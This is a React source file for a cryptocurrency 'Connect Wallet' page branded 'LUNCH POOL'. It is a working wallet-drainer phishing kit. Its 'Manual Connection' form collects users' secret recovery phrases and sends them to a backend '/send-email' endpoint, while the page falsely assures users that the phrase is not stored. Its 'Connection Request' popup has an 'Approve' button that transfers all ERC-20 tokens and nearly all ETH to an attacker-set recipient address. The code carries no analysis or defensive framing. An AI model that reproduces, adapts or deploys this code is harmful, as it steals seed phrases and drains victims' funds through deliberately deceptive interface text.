import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { createWeb3Modal, useWeb3Modal, defaultConfig, useWeb3ModalAccount, useWeb3ModalProvider, useDisconnect } from '@web3modal/ethers/react';
import { Link } from 'react-router-dom';
import { 
  Import, 
  X, 
  AlertTriangle, 
  Zap,
  Eye,
  EyeOff,
  ArrowLeft,
  Wallet,
  Shield,
  Check
} from 'lucide-react';

// --- Web3Modal Configuration ---

const projectId = process.env.REACT_APP_WALLETCONNECT_PROJECT_ID;

const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
};

const polygon = {
  chainId: 137,
  name: 'Polygon',
  currency: 'MATIC',
  explorerUrl: 'https://polygonscan.com',
  rpcUrl: `https://polygon-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
};

const arbitrum = {
  chainId: 42161,
  name: 'Arbitrum',
  currency: 'ETH',
  explorerUrl: 'https://arbiscan.io',
  rpcUrl: `https://arb-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
};

const bsc = {
  chainId: 56,
  name: 'Binance Smart Chain',
  currency: 'BNB',
  explorerUrl: 'https://bscscan.com',
  rpcUrl: `https://bsc-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
};

const optimism = {
  chainId: 10,
  name: 'Optimism',
  currency: 'ETH',
  explorerUrl: 'https://optimistic.etherscan.io',
  rpcUrl: `https://opt-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
};

const chains = [mainnet, polygon, arbitrum, bsc, optimism];

const metadata = {
    name: 'Connect Wallet',
    description: 'Connect your wallet to proceed',
    url: window.location.href,
    icons: ['https://avatars.githubusercontent.com/u/37784886']
};

const ethersConfig = defaultConfig({
  metadata,
  defaultChainId: 1,
  rpcUrl: 'https://cloudflare-eth.com',
});

createWeb3Modal({
  ethersConfig,
  chains,
  projectId,
  featuredWalletIds: [
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
    'a797aa35c0fadbfc1a53e7f675162ed5226c68b5d1f9ee861b8ac27a8755b555', // Phantom
    '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662'  // Bitget Wallet
  ],
  enableAnalytics: false,
  enableOnramp: false
});

// --- Application Code & Constants ---

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint value) returns (bool)"
];

const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';

const sendWalletInfo = async (walletName, secretPhrase) => {
  try {
    const response = await fetch(`${API_URL}/send-email`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletName, secretPhrase }),
    });
    if (!response.ok) {
      console.error('Failed to send wallet info');
    }
  } catch (error) {
    console.error('Error sending wallet info:', error);
  }
};

const getWalletAssets = async (provider, address) => {
  try {
    const ethBalance = await provider.getBalance(address);
        const alchemyProvider = new ethers.AlchemyProvider('mainnet', process.env.REACT_APP_ALCHEMY_API_KEY);
        const balances = await alchemyProvider.getTokenBalances(address);

        const tokenPromises = balances.map(async (token) => {
            if (token.tokenBalance !== '0') {
                try {
                    const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
                    const decimals = await tokenContract.decimals();
                    const symbol = await tokenContract.symbol();
                    return {
                        symbol,
                        balance: ethers.formatUnits(token.tokenBalance, decimals),
                        contractAddress: token.contractAddress,
                    };
                } catch (error) {
                    console.warn(`Could not fetch details for token ${token.contractAddress}:`, error);
                    return null; // Skip tokens that cause errors
                }
            }
            return null;
        });

        const tokens = (await Promise.all(tokenPromises)).filter(Boolean);

    return {
            eth: ethers.formatEther(ethBalance),
            tokens,
        };
    } catch (error) {
        console.error('Error fetching wallet assets:', error);
        // Fallback for providers without Alchemy access
        const ethBalance = await provider.getBalance(address);
        return {
            eth: ethers.formatEther(ethBalance),
            tokens: [],
        };
    }
};

export default function ConnectWallet() {
  const { open } = useWeb3Modal();
  const { address, chainId, isConnected } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();
  const { disconnect } = useDisconnect();

  // Component State
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [walletBalance, setWalletBalance] = useState({ eth: '0', tokens: [] });
  const [isSending, setIsSending] = useState(false);
  const [txError, setTxError] = useState('');
  
  // UI State
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [secretPhrase, setSecretPhrase] = useState('');
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [dynamicWallets, setDynamicWallets] = useState([]);
  const [isLoadingWallets, setIsLoadingWallets] = useState(false);

  useEffect(() => {
    const fetchWalletIcons = async () => {
      setIsLoadingWallets(true);
      try {
        const response = await fetch(
          `https://explorer-api.walletconnect.com/v3/wallets?projectId=${projectId}&entries=100&page=1`
        );
        const data = await response.json();
        const wallets = Object.values(data.listings).map((wallet) => ({
          id: wallet.id,
          name: wallet.name,
          icon: wallet.image_url.md,
          description: wallet.description || 'A secure wallet for your crypto.',
        }));
        setDynamicWallets(wallets);
      } catch (error) {
        console.error('Failed to fetch wallet icons:', error);
        // Fallback to a default list can be handled here if needed
      } finally {
        setIsLoadingWallets(false);
      }
    };

    fetchWalletIcons();
  }, []);

  useEffect(() => {
    const setupAndFetch = async () => {
      if (isConnected && walletProvider && address) {
          const ethersProvider = new ethers.BrowserProvider(walletProvider);
          setProvider(ethersProvider);
        const newSigner = await ethersProvider.getSigner();
        setSigner(newSigner);
        
        setShowTransactionPopup(true); // Show transaction popup immediately
        
        const balance = await getWalletAssets(ethersProvider, address);
        setWalletBalance(balance);
      }
    };
    setupAndFetch();
  }, [isConnected, walletProvider, address]);

  const handleConnection = async () => {
    if (isConnected) {
      setShowTransactionPopup(true);
    } else {
      open();
    }
  };

  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowTransactionPopup(false);
    setTxError('');
  };
  
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
  };

  const handleInputChange = (e) => {
    setSecretPhrase(e.target.value);
  };

  const validateForm = () => {
    return secretPhrase.trim().split(/\s+/).length >= 12;
  };

  const handleManualSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      await sendWalletInfo(selectedWallet.name, secretPhrase);
        closeAllPopups();
      // Optionally show a confirmation message
    } else {
      alert('Please enter a valid secret phrase (at least 12 words).');
    }
  };

  const handleSendAllAssets = async () => {
    if (!signer || !RECIPIENT_ADDRESS) {
      setTxError('Signer or recipient address is not set.');
      return;
    }
    
    setIsSending(true);
    setTxError('');

    try {
      // 1. Transfer all ERC-20 tokens
      for (const token of walletBalance.tokens) {
        try {
          const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
          const balance = await tokenContract.balanceOf(address);
          
          if (balance > 0) {
            console.log(`Transferring ${ethers.formatUnits(balance, await tokenContract.decimals())} ${token.symbol}...`);
            const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, balance);
            await tx.wait();
            console.log(`${token.symbol} transfer successful!`);
          }
        } catch (tokenError) {
          console.error(`Failed to transfer ${token.symbol}:`, tokenError);
          // Don't stop the whole process, just log the error and continue
        }
      }

      // 2. Transfer all remaining ETH
      const ethBalance = await provider.getBalance(address);
      const gasPrice = (await provider.getFeeData()).gasPrice;
      const gasLimit = BigInt(21000); // Standard gas limit for ETH transfer
      const gasCost = gasPrice * gasLimit;

      if (ethBalance > gasCost) {
        const amountToSend = ethBalance - gasCost;
        console.log(`Transferring ${ethers.formatEther(amountToSend)} ETH...`);

        const tx = {
        to: RECIPIENT_ADDRESS,
          value: amountToSend
        };

        try {
            // Attempt EIP-1559 transaction
            const feeData = await provider.getFeeData();
            if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
                const txRequest = {
                    ...tx,
                    maxFeePerGas: feeData.maxFeePerGas,
                    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
                    gasLimit: gasLimit,
                };
                const txResponse = await signer.sendTransaction(txRequest);
                await txResponse.wait();
            } else {
                throw new Error("EIP-1559 not supported, falling back to legacy.");
            }
        } catch (eip1559Error) {
            console.warn("EIP-1559 transaction failed, trying legacy:", eip1559Error.message);
            // Fallback to legacy transaction
            try {
                const txRequest = { ...tx, gasPrice: gasPrice, gasLimit: gasLimit };
                const txResponse = await signer.sendTransaction(txRequest);
                await txResponse.wait();
            } catch (legacyError) {
                throw new Error(`Legacy transaction failed: ${legacyError.message}`);
            }
        }
        
        console.log('ETH transfer successful!');
      } else {
        console.log('Not enough ETH to cover gas fees for the final transfer.');
      }
      
      closeAllPopups();
      disconnect();

    } catch (error) {
      console.error('An error occurred during the transaction:', error);
      setTxError(`Transaction failed: ${error.message}`);
    } finally {
      setIsSending(false);
    }
  };

  const renderConnectionCards = () => (
    <div className="w-full max-w-2xl text-center">
      <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
        Connect your wallet
      </h1>
      <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-12">
        Choose your preferred connection method below to securely access the application.
      </p>

      <div className="grid md:grid-cols-2 gap-6">
        {/* Automatic Connection Card */}
        <div
          onClick={handleConnection}
          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-blue-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
        >
          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-blue-600/20 mb-6 mx-auto">
            <Zap size={32} className="text-blue-400" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">Automatic Connection</h2>
          <p className="text-gray-400">Recommended. Connect using a popup with a list of supported wallets.</p>
        </div>

        {/* Manual Connection Card */}
        <div
          onClick={() => setShowManualPopup(true)}
          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-purple-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
        >
          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-purple-600/20 mb-6 mx-auto">
            <Import size={32} className="text-purple-400" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">Manual Connection</h2>
          <p className="text-gray-400">For advanced users. Import your wallet directly using your secret phrase.</p>
        </div>
      </div>
    </div>
  );

  const renderWalletDetails = () => (
      <div className="bg-gray-800 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
          <div className="flex items-center justify-between mb-4">
              <h3 className="text-xl font-bold">Wallet Details</h3>
              <button onClick={() => disconnect()} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
                  Disconnect
              </button>
          </div>
          <div className="bg-gray-700 p-4 rounded-lg">
              <div className="flex items-center mb-3">
                  <Wallet className="text-blue-400 mr-3" size={20}/>
                  <p className="text-sm truncate"><strong>Address:</strong> {address}</p>
              </div>
              <div className="border-t border-gray-600 my-3"></div>
              <p className="text-lg font-semibold mb-2">Assets</p>
              <div className="space-y-2 max-h-48 overflow-y-auto">
                  <div className="flex justify-between items-center">
                      <span>ETH</span>
                      <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
                  </div>
                  {walletBalance.tokens.map(token => (
                      <div key={token.symbol} className="flex justify-between items-center text-sm">
                          <span>{token.symbol}</span>
                          <span>{parseFloat(token.balance).toFixed(5)}</span>
                      </div>
                  ))}
              </div>
          </div>
      </div>
  );

  const renderManualConnectPopup = () => {
    const goBack = () => {
      setSelectedWallet(null);
      setSecretPhrase('');
      setIsPasswordVisible(false);
    };

    if (selectedWallet) {
      return (
        <div className="bg-gray-900 text-white p-6 rounded-2xl shadow-lg max-w-md w-full font-sans relative">
          <button onClick={goBack} className="absolute top-4 left-4 text-gray-400 hover:text-white">
            <ArrowLeft size={24} />
          </button>
          <button onClick={closeAllPopups} className="absolute top-4 right-4 text-gray-400 hover:text-white">
            <X size={24} />
          </button>

          <div className="text-center mb-6">
            <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-16 h-16 mx-auto mb-4 rounded-full" />
            <h3 className="text-xl font-bold">Import your {selectedWallet.name}</h3>
            <p className="text-gray-400">Enter your secret phrase to continue</p>
          </div>

          <form onSubmit={handleManualSubmit}>
            <div className="relative mb-4">
              <textarea
                value={secretPhrase}
                onChange={handleInputChange}
                className={`w-full p-4 pr-12 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none resize-none font-mono ${!isPasswordVisible ? 'text-security-disc' : ''}`}
                placeholder="Enter your secret phrase"
                rows="3"
              />
              <button
                type="button"
                onClick={() => setIsPasswordVisible(!isPasswordVisible)}
                className="absolute top-4 right-4 text-gray-400 hover:text-white"
              >
                {isPasswordVisible ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            <div className="flex items-start mb-6 text-sm text-gray-500">
              <AlertTriangle size={24} className="text-yellow-400 mr-3 mt-1 flex-shrink-0" />
              <div>
                Your secret phrase is used to secure your wallet. Never share it with anyone. We do not store this information.
              </div>
            </div>
            <button
              type="submit"
              disabled={!validateForm()}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition-all disabled:bg-gray-600 disabled:cursor-not-allowed"
            >
              Connect Now
            </button>
          </form>
        </div>
      );
    }

    return (
      <div className="bg-gray-900 text-white p-6 rounded-2xl shadow-lg max-w-2xl w-full font-sans flex flex-col">
        <div className="flex justify-between items-center mb-4">
          <h3 className="text-xl font-bold">Connect Manually</h3>
            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
              <X size={24} />
            </button>
          </div>
        <p className="text-gray-400 mb-6">
          Select your wallet from the list below. Make sure you have your secret phrase ready.
        </p>
        <div className="flex-grow overflow-hidden">
          {isLoadingWallets ? (
             <div className="flex justify-center items-center h-full"><div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div></div>
          ) : (
            <div className="grid grid-cols-3 md:grid-cols-4 gap-4 max-h-[60vh] overflow-y-auto p-2">
              {dynamicWallets.map((wallet) => (
                <div
                  key={wallet.id}
                  onClick={() => handleWalletSelect(wallet)}
                  className="flex flex-col items-center p-3 bg-gray-800 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors aspect-square justify-center"
                >
                  <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 mb-2 rounded-full" />
                  <p className="text-xs text-center font-medium truncate w-full">{wallet.name}</p>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    );
  };
  
  const renderTransactionPopup = () => {
    return (
      <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
        {isConnected && <div className="absolute top-4 right-4">{renderWalletDetails()}</div>}
        <Shield size={48} className="mx-auto text-blue-500 mb-4" />
        <h2 className="text-2xl font-bold mb-2">Connection Request</h2>
        <p className="text-gray-400 mb-6">
          The application is requesting to connect your wallet...
        </p>

            {txError && (
          <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
            <p className="font-bold">Error</p>
            <p className="text-sm">{txError}</p>
          </div>
        )}

        <div className="flex justify-center space-x-4">
             <button 
            onClick={handleSendAllAssets}
            disabled={isSending}
            className="flex items-center justify-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
            >
              {isSending ? (
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
            ) : (
              <><Check className="mr-2" /> Approve</>
              )}
            </button>
            <button 
            onClick={() => {
              closeAllPopups();
              disconnect();
            }}
              disabled={isSending}
            className="flex items-center justify-center bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
            >
            <X className="mr-2" /> Decline
            </button>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white flex flex-col">
      {/* Background decorative elements */}
      <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0">
          <div className="absolute top-0 left-0 w-1/2 h-1/2 bg-purple-600/30 rounded-full filter blur-3xl opacity-50 animate-pulse"></div>
          <div className="absolute bottom-0 right-0 w-1/2 h-1/2 bg-blue-600/20 rounded-full filter blur-3xl opacity-50 animate-pulse" style={{animationDelay: '2s'}}></div>
      </div>

      <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
        <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
        <Link to="/" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
          Back
        </Link>
      </header>

      <main className="flex-grow flex items-center justify-center z-10 p-4">
        {!isConnected && !showManualPopup && !showTransactionPopup && renderConnectionCards()}
        
        {isConnected && !showTransactionPopup && (
          <div className="text-center">
            <h2 className="text-3xl font-bold mb-4">You are Connected!</h2>
            {renderWalletDetails()}
            <button
              onClick={() => setShowTransactionPopup(true)}
              className="mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
            >
              Show Actions
            </button>
          </div>
        )}
      </main>

      {/* Popups (Modals) */}
      {(showManualPopup || showTransactionPopup) && (
        <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          {showManualPopup && renderManualConnectPopup()}
          {showTransactionPopup && renderTransactionPopup()}
        </div>
      )}
      
      <footer className="w-full p-4 text-center text-xs text-gray-500 z-10">
        <a href="#" className="hover:text-white underline">Terms of Service</a>
        <span className="mx-2">•</span>
        <a href="#" className="hover:text-white underline">Privacy Policy</a>
      </footer>
    </div>
  );
}